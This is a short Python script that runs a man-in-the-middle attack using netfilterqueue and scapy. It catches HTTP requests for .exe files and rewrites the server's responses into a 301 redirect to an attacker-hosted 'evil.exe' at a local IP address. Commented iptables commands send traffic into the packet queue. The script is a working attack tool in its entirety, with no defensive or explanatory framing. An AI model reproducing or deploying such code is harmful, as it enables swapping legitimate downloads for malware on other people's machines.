#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import os

#os.system("iptables --flush")
# os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
# os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
#os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.131.137" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.131.137/evil.exe \n\n")
                packet.set_payload(bytes(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
